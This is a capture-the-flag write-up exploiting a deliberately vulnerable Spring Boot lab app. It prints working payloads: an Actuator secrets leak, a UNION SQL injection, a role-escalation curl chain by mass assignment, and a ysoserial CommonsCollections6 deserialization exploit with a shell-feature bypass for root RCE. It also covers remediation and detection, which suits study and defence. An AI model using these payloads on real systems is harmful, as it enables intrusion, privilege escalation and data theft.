# TryHackMe — Web Frameworks: Java

> **Platform:** TryHackMe  
> **Room:** [Web Frameworks: Java](https://tryhackme.com/room/webframeworksjava)  
> **Type:** Theory / White-Box Guided  
> **Target:** Spring Boot application (`vulnbank.jar`) on Linux  
> **Stack:** Java 17+ · Spring Boot · Spring MVC · MySQL · commons-collections 3.1  
> **Flags captured:** 5/5  
> **Severity:** Critical — application runs as **root**, RCE yields full host compromise without privilege escalation  

---

## Table of Contents

- [Executive Summary](#executive-summary)
- [Phase 1 — Intelligence Gathering](#phase-1--intelligence-gathering)
- [Phase 2 — Vulnerability Analysis](#phase-2--vulnerability-analysis)
- [Phase 3 — Exploitation](#phase-3--exploitation)
  - [3.1 Spring Boot Actuator Environment Leak](#31-spring-boot-actuator-environment-leak)
  - [3.2 JDBC UNION SQL Injection](#32-jdbc-union-sql-injection)
  - [3.3 Spring Mass Assignment (Autobinding)](#33-spring-mass-assignment-autobinding)
  - [3.4 Java Deserialization RCE via Commons-Collections](#34-java-deserialization-rce-via-commons-collections)
- [Phase 4 — Post-Exploitation](#phase-4--post-exploitation)
  - [4.1 Host-Only Flag Recovery](#41-host-only-flag-recovery)
- [Kill-Chain Summary](#kill-chain-summary)
- [Standards Mapping](#standards-mapping)
- [Remediation](#remediation)
- [Lessons Learned](#lessons-learned)

---

## Executive Summary

The target is a Spring Boot banking application (`vulnbank.jar`) exposing four independent vulnerability classes, each exploitable without authentication or with self-registered credentials. The attack surface spans from misconfigured management endpoints through classic injection to unsafe deserialization, culminating in unauthenticated Remote Code Execution as **root**. A fifth flag, accessible only from the host filesystem, confirms full compromise through the deserialization foothold.

From a regulatory perspective (DORA Art. 25, TIBER-EU), every finding maps to an ICT risk that a Threat-Led Penetration Test would flag: uncontrolled exposure of operational secrets (Actuator), integrity failure in data-layer queries (SQLi), broken authorization boundary in the domain model (mass assignment), and absence of input validation on serialized objects (deserialization RCE). The root-level execution context eliminates the need for privilege escalation and grants immediate access to all host resources — a single-step path from network access to total compromise.

---

## Phase 1 — Intelligence Gathering

| Port | Service | Notes |
|------|---------|-------|
| 8080/tcp | Spring Boot (embedded Tomcat) | `vulnbank.jar`, MySQL backend |

**Application fingerprinting:**

- Spring Boot with Actuator enabled (`/actuator` base path responds)
- Whitelabel error pages expose framework version
- `/actuator/mappings` reveals full controller map: `/search`, `/account/*`, `/admin`, `/internal/import`
- `pom.xml` dependency: `commons-collections:commons-collections:3.1` on classpath

**Key observation:** `management.endpoints.web.exposure.include=*` — a single wildcard value in `application.properties` disables the default web-exposure allow-filter (which restricts to `health` and `info` only), exposing all Actuator endpoints including `env`, `heapdump`, `beans`, `configprops`.

---

## Phase 2 — Vulnerability Analysis

Four independent vectors identified through white-box source review. Each is a distinct vulnerability class — they do not chain into one another, but the deserialization RCE enables post-exploitation access to the host.

| # | Vector | Root Cause | Requires Auth |
|---|--------|-----------|---------------|
| 1 | Actuator env leak | Wildcard management endpoint exposure | No |
| 2 | UNION SQLi | `Statement` string concatenation | No |
| 3 | Mass assignment | `@ModelAttribute` autobinds server-owned fields | Self-registered |
| 4 | Deserialization RCE | `ObjectInputStream.readObject()` on untrusted input | No |

---

## Phase 3 — Exploitation

### 3.1 Spring Boot Actuator Environment Leak

**CWE-16** (Configuration) / **CWE-200** (Information Exposure)  
**CVSS 3.1:** 7.5 (High) — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N  

**Mechanism:** The configuration property `management.endpoints.web.exposure.include=*` removes the web-exposure allow-filter entirely. By default, Spring Boot 2.x+ exposes only `/actuator/health` and `/actuator/info` over HTTP. The wildcard overrides this to expose all registered endpoints. Critically, `/actuator/env` reveals application properties including secrets, database credentials, and API keys — values that Spring attempts to sanitize by key-name pattern matching but which can be bypassed or are incomplete.

```
GET /actuator/env/app.actuatorflag HTTP/1.1
```

**Flag:** `THM{4ctu4t0r_***_l34kZ}`

> **YAML caveat:** In `application.yml`, the bare `*` is a YAML alias anchor and must be quoted: `include: "*"`. In `.properties` format, no quoting is needed. This is a common misconfiguration source — developers copy a `.properties` example into YAML without quoting.

**DORA context (Art. 9 — Protection and Prevention):** Exposure of operational secrets through management interfaces constitutes a failure in ICT system configuration management. The `env` and `heapdump` endpoints can leak database credentials, encryption keys, and third-party API tokens — enabling lateral movement into backend systems without exploiting any application-layer vulnerability.

---

### 3.2 JDBC UNION SQL Injection

**CWE-89** (SQL Injection)  
**CVSS 3.1:** 8.6 (High) — AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N  

**Mechanism:** The `/search` endpoint constructs SQL queries via string concatenation using `Statement.executeQuery("SELECT id, title, body FROM entries WHERE title LIKE '%" + q + "%'")` instead of parameterized `PreparedStatement` with bound `?` placeholders. This allows an attacker to break out of the string literal and inject arbitrary SQL.

```bash
curl -s --get 'http://<TARGET>:8080/search' \
  --data-urlencode "q=' UNION SELECT id, secret, secret FROM flags -- "
```

**Payload breakdown:**

| Token | Purpose |
|-------|---------|
| `'` | Closes the opening single quote of the `LIKE '%...` clause |
| `UNION SELECT` | Appends a second result set to the original query |
| `id, secret, secret` | Three columns to match the original `id, title, body` (UNION requires equal column count and type-compatible positions) |
| `FROM flags` | Reads from the `flags` table (discovered via schema enumeration or source review) |
| `-- ` | MySQL single-line comment; the **trailing space** is mandatory — MySQL requires whitespace after `--` |

The `secret` column is duplicated into both `title` and `body` positions to ensure the flag renders regardless of which column the frontend displays.

**Flag:** `THM{jdbc_str1ng_***_un10n}`

**DORA context (Art. 7 — ICT Risk Management Framework):** SQL injection in a financial application represents a data integrity and confidentiality failure. In a banking context, this primitive enables unauthorized read access to any database table the application user can query — account balances, transaction records, PII — and potentially write access depending on database permissions.

---

### 3.3 Spring Mass Assignment (Autobinding)

**CWE-915** (Improperly Controlled Modification of Dynamically-Determined Object Attributes)  
**CVSS 3.1:** 8.1 (High) — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N  

**Mechanism:** Spring MVC's `@ModelAttribute` annotation on the `User` entity automatically binds *all* matching HTTP request parameters to the object's fields — including server-owned fields like `role`. When a controller method accepts `@ModelAttribute User user` for an account update, an attacker can append `role=ADMIN` to the request, and Spring will populate it because no allow-list restricts which fields the binder may set.

**Attack chain:**

```bash
# 1. Register
curl -s -X POST http://<TARGET>:8080/account/register \
  -d "username=attacker&password=pass123&email=a@a.com" -c cj

# 2. Authenticate
curl -s -X POST http://<TARGET>:8080/account/login \
  -d "username=attacker&password=pass123" -c cj -b cj

# 3. Escalate — inject server-owned field
curl -s -X POST http://<TARGET>:8080/account/update \
  -d "email=a@a.com&role=ADMIN" -b cj -c cj

# 4. Access admin panel
curl -s http://<TARGET>:8080/admin -b cj
```

The trust boundary is misplaced: `role` is bound from the same parameter set as user-editable fields like `email`. The `/admin` endpoint's role check works correctly — the vulnerability is that the client can reach a server-owned field through the binder.

**Flag:** `THM{spr1ng_m4ss_***_4ss1gnm3nt}`

**Remediation pattern (lighter, no DTO):**

```java
@InitBinder
public void initBinder(WebDataBinder binder) {
    binder.setAllowedFields("email", "password");
}
```

Whitelist (`setAllowedFields`) is strictly preferred over blacklist (`setDisallowedFields`) — a blacklist fails silently when new fields are added to the entity. Architecturally cleaner: use a dedicated DTO with only the editable fields, decoupled from the domain entity. For application-wide protection: `@ControllerAdvice` + `@InitBinder`.

**DORA context (Art. 9 — Protection and Prevention):** Broken authorization at the data-binding layer constitutes an access control failure. In a regulated financial application, this enables vertical privilege escalation — a retail banking user could gain administrative access to internal operations, compliance dashboards, or transaction approval workflows.

---

### 3.4 Java Deserialization RCE via Commons-Collections

**CWE-502** (Deserialization of Untrusted Data)  
**CVSS 3.1:** 9.8 (Critical) — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H  

**Mechanism:** The `/internal/import` endpoint passes the raw HTTP request body directly to `ObjectInputStream.readObject()` without any filtering or type validation. The classpath includes `commons-collections:3.1` (vulnerable range: 3.1–3.2.1), which provides the `InvokerTransformer` class — a `Serializable` class capable of reflective `Method.invoke` on arbitrary methods. This combination (unsafe receiver + vulnerable gadget library) enables unauthenticated Remote Code Execution.

**Key concept:** The payload is not a command string — it is a **serialized object graph** (a gadget chain) whose *reconstruction during deserialization* triggers code execution. The command is a field value buried deep inside nested transformer objects.

**Gadget chain — CommonsCollections6 (CC6):**

```
HashSet.readObject()
  → HashMap.put(key, ...)
    → key.hashCode()                    // TiedMapEntry
      → TiedMapEntry.getValue()
        → LazyMap.get()
          → ChainedTransformer.transform()
            → ConstantTransformer(Runtime.class)
            → InvokerTransformer("getMethod", "getRuntime")
            → InvokerTransformer("invoke", null)
            → InvokerTransformer("exec", cmd)
```

CC6 is preferred over CC1 because it does not depend on `AnnotationInvocationHandler` internals that broke in JDK 8u72+ / JDK 9+. CC6's trigger (`hashCode()` inside `HashSet.readObject()`) is JDK-version-robust.

**Payload generation and delivery:**

```bash
# Generate (JDK 17+ requires JPMS opens)
java --add-opens=java.base/java.util=ALL-UNNAMED \
     --add-opens=java.base/java.lang=ALL-UNNAMED \
     -jar ysoserial-all.jar CommonsCollections6 \
     'cp /flags/deser.txt /app/loot/out.txt' \
     | base64 -w0 > payload.b64

# Deliver
curl -s -X POST http://<TARGET>:8080/internal/import \
  -H 'Content-Type: application/octet-stream' \
  --data-binary @payload.b64

# Read back
curl -s http://<TARGET>:8080/loot/out.txt
```

**Response analysis:** `{"status":"imported","type":"java.util.HashSet"}` — the `hashCode()` trigger fires *inside* `readObject()`, before the server calls `getClass().getName()`. By the time the response is constructed, the command has already executed. This response proves gadget execution, **not** command success — the shell command runs blind (`Runtime.exec` returns no output to the HTTP response).

**Flag:** `THM{j4v4_d3s3r***_rc3}`

**Tooling notes (2026):**

| Issue | Cause | Fix |
|-------|-------|-----|
| `Error: Unable to access jarfile ysoserial-all.jar` | GitHub releases removed per Community Guidelines | Download via JitPack: `wget -O ysoserial-all.jar https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar` |
| `mvn clean package` fails: `Source option 6 is no longer supported` | `pom.xml` pins `source/target=1.6`; JDK 17+ dropped `-source 6` | Use JitPack prebuilt fat-jar; don't build from source on modern JDK |
| `InaccessibleObjectException: module java.base does not "opens java.util"` | JPMS strong encapsulation (JDK 9+) blocks reflective `setAccessible` on `HashSet.map` | Add `--add-opens java.base/java.util=ALL-UNNAMED --add-opens java.base/java.lang=ALL-UNNAMED` |
| Server returns `{"detail":"null"}` (NPE) | Empty payload body (cascade from missing jar → empty stdout → empty `.b64` file) | Fix upstream cause; verify jar exists before generating |
| Base64 payload corrupted on delivery | `curl --data-binary` defaults to `Content-Type: application/x-www-form-urlencoded`, which percent-encodes `=`, `+`, `/` | Set `-H 'Content-Type: application/octet-stream'` explicitly |

**`Runtime.exec(String)` limitation:** No shell — the string is tokenized on whitespace and passed directly to `ProcessBuilder`. Plain commands (`cp`, `id`, `cat`) work. Shell features (pipes, redirects, command substitution) require the brace-expansion trick:

```bash
bash -c {echo,<BASE64_COMMAND>}|{base64,-d}|bash
```

**DORA context (Art. 11 — Response and Recovery):** Unauthenticated RCE in a financial application is a Critical-severity ICT incident per DORA's classification. The deserialization primitive is *stable and repeatable* (confirmed by sending a second payload writing `out2.txt` — idempotent, not one-shot), providing persistent arbitrary command execution. Combined with root-level execution context, this constitutes total system compromise — an attacker could exfiltrate database contents, deploy backdoors, pivot to internal networks, or manipulate transaction data. From a TIBER-EU perspective, this finding alone would terminate the controlled phase and trigger immediate remediation.

---

## Phase 4 — Post-Exploitation

### 4.1 Host-Only Flag Recovery

With the deserialization RCE established, post-exploitation focused on enumerating the host filesystem through blind command execution (commands write output to `/app/loot/`, read back via HTTP).

**Discovery chain:**

1. `ls -la /root` — returned contents despite `drwx------` (700) permissions → **application runs as root**
2. `find / -name "*flag*" -type f` — only matched kernel pseudo-files in `/sys` and `/proc` (basename match misses `/flags/` directory where files are named `chain.txt`/`deser.txt`)
3. `grep -rIl "THM{" /flags /root /home /opt /var /etc` — content-based search found `/flags/chain.txt` and `/flags/deser.txt`

**Key diagnostic lesson:** `find -name` matches the *basename* of a file, not the path. A directory named `/flags/` won't be found by `-name "*flag*" -type f`, and its contents (`chain.txt`) don't contain "flag" in their names. **When hunting unknown files, search by content, not by name.**

**Exfiltration:**

```bash
CMD='cp /flags/chain.txt /app/loot/chain.txt'
# ... standard CC6 pipeline ...
curl -s http://<TARGET>:8080/loot/chain.txt
```

**Flag:** `THM{wh1t3b0x_***_full_ch41n}`

**Root-level execution — severity amplifier:** The Spring Boot application runs as `root` (UID 0). This is a critical misconfiguration independent of any application vulnerability: *any* RCE — current or future — immediately grants full host control without privilege escalation. In a production environment, the application should run under a dedicated service account with minimal filesystem and network permissions (principle of least privilege, NIST SP 800-123).

---

## Kill-Chain Summary

```
1. [T1595] Actuator endpoint enumeration → management surface mapped
2. [T1190] /actuator/env → application secrets leaked (Flag 1)
3. [T1190] /search SQLi → database secrets exfiltrated (Flag 2)
4. [T1190] /account/update mass assignment → role escalation to ADMIN (Flag 3)
5. [T1190] /internal/import deserialization → RCE as root (Flag 4)
6. [T1083] Filesystem discovery via blind grep → /flags/chain.txt located
7. [T1005] Data exfil via static dir write → host-only flag recovered (Flag 5)
```

---

## Standards Mapping

| # | Finding | CWE | WSTG | OWASP Top 10 | ATT&CK | CVSS 3.1 |
|---|---------|-----|------|--------------|--------|----------|
| 1 | Actuator env leak | CWE-16, CWE-200 | WSTG-CONF-05 | A05:2021 | T1190 | 7.5 High |
| 2 | JDBC UNION SQLi | CWE-89 | WSTG-INPV-05 | A03:2021 | T1190 | 8.6 High |
| 3 | Spring mass assignment | CWE-915 | WSTG-BUSL-01, WSTG-ATHZ-03 | A01:2021, API3:2023 | T1190 | 8.1 High |
| 4 | Deserialization RCE | CWE-502 | WSTG-INPV-19 | A08:2021 | T1190 | 9.8 Critical |
| 5 | Root-level execution | CWE-250 | — | A05:2021 | — | Severity amplifier |

---

## Remediation

### Immediate (Sprint 0)

| Finding | Fix | Effort |
|---------|-----|--------|
| Actuator exposure | Set `management.endpoints.web.exposure.include=health,info`. Exclude `env` and `heapdump` explicitly. Bind management port to loopback (`management.server.port=9090`, `management.server.address=127.0.0.1`). Gate remaining endpoints behind Spring Security. | Low |
| SQL Injection | Replace all `Statement.executeQuery(... + param)` with `PreparedStatement` using `?` bind parameters. Restrict JDBC user grants to prevent cross-schema queries (`REVOKE SELECT ON flags FROM app_user`). | Low |
| Mass assignment | Add `@InitBinder` with `binder.setAllowedFields(...)` whitelist to every controller accepting `@ModelAttribute`. Migrate to dedicated DTOs for request binding, decoupled from domain entities. Apply globally via `@ControllerAdvice`. | Medium |
| Deserialization RCE | **Do not deserialize untrusted input.** Remove `/internal/import` or replace `ObjectInputStream` with a safe format (JSON/Protobuf). If Java serialization is unavoidable, implement JEP 290 `ObjectInputFilter` with a strict class allow-list. | Medium |
| Root execution | Run the application under a dedicated service account (`useradd -r -s /usr/sbin/nologin vulnbank`). Apply filesystem ACLs: read-only on application JAR, write only to designated data directories. | Low |

### Strategic (Quarterly Roadmap)

| Area | Action | DORA Article |
|------|--------|--------------|
| Dependency governance | Implement SCA pipeline (Dependency-Track / Snyk) scanning `pom.xml` for known-vulnerable libraries. `commons-collections:3.1` would be flagged immediately. Upgrade to 4.4+ or 3.2.2+ where `InvokerTransformer` deserialization is disabled by default. | Art. 8 (Identification) |
| SAST integration | Deploy static analysis (Semgrep / SonarQube) with rules for string-concatenated SQL, unrestricted `@ModelAttribute`, and `ObjectInputStream.readObject()` on untrusted input. | Art. 8 (Identification) |
| Network segmentation | Isolate management endpoints (Actuator) on a dedicated management VLAN. Internal-only endpoints like `/internal/import` must not be reachable from user-facing network segments. | Art. 9 (Protection) |
| Incident detection | Implement deserialization attack signatures in WAF/IDS (serialized Java magic bytes `0xACED0005`). Monitor for `commons-collections` gadget class instantiation in application logs. | Art. 10 (Detection) |
| TIBER-EU readiness | Include Java deserialization and Spring-specific vectors in the threat intelligence phase of TLPT scenarios. The full chain demonstrated here (actuator recon → deser RCE → root) represents a realistic attack path against Spring Boot applications in the financial sector. | Art. 26 (TLPT) |

---

## Lessons Learned

1. **Deserialization mental model:** The payload is not a command — it is an *object graph whose reconstruction is execution*. The receiver (`ObjectInputStream.readObject()`) and a vulnerable gadget library (`commons-collections:3.1`) are both required. Neither alone is exploitable. This is the same data→code-at-parse class as Node.js `node-serialize` and Python `pickle`.

2. **Modern JDK friction is now standard tax:** Every old Java offensive tool (ysoserial, GadgetProbe) hits two walls on JDK 17+: (a) JPMS strong encapsulation (`--add-opens` required), (b) removed source compatibility levels (can't build from source). JitPack prebuilt jars bypass both.

3. **Cascade diagnosis reflex:** Three downstream errors (empty stdout → empty payload file → server NPE) traced to one upstream cause (missing JAR). Don't treat symptoms as independent bugs — trace upstream first.

4. **Content-based file discovery:** `find -name` matches basenames, not paths. When hunting files with unknown names, `grep -rIl "<pattern>"` across target directories is more reliable than name-based guessing.

5. **Blind RCE verification:** `{"status":"imported"}` proves the gadget chain fired (deserialization succeeded), **not** that the embedded shell command succeeded. `Runtime.exec` output does not reach the HTTP response. Always verify command execution independently (write a file and read it back).

6. **curl Content-Type matters for binary payloads:** `--data-binary` without an explicit `Content-Type` defaults to `application/x-www-form-urlencoded`, which percent-encodes base64 characters (`=`, `+`, `/`). Always set `application/octet-stream` for binary or base64 POST bodies.
